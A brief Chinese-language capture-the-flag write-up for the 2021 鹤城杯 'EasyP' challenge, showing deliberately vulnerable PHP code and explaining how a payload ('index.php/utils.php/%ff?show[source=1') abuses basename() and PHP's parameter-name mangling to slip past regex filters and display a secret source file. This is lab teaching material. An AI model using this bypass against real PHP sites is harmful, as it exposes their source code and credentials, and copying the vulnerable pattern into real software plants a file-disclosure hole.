# 鹤城杯 2021EasyP

```php
<?php
include 'utils.php';

if (isset($_POST['guess'])) {
    $guess = (string) $_POST['guess'];
    if ($guess === $secret) {
        $message = 'Congratulations! The flag is: ' . $flag;
    } else {
        $message = 'Wrong. Try Again';
    }
}

if (preg_match('/utils\.php\/*$/i', $_SERVER['PHP_SELF'])) {
    exit("hacker :)");
}

if (preg_match('/show_source/', $_SERVER['REQUEST_URI'])){
    exit("hacker :)");
}

if (isset($_GET['show_source'])) {
    highlight_file(basename($_SERVER['PHP_SELF']));
    exit();
}else{
    show_source(__FILE__);
}
?> 
```

例如：http://127.0.0.1/phplab/?show[source=1

`$_SERVER['PHP_SELF'])`返回/phplab/index.php，返回当前运行脚本

`$_SERVER['REQUEST_URI'])`返回/phplab/?show[source=1，返回路径和参数

```
basename函数，返回路径中的文件名部分，即返回最后一个/后面的字符
```

其绕过原理为：在使用默认语言环境设置时，`basename()` 会删除文件名开头的非 ASCII 字符和中文

payload

```
index.php/utils.php/%ff?show[source=1
```

```
. [ 空格 +这四个在传参时会被解析成_
```

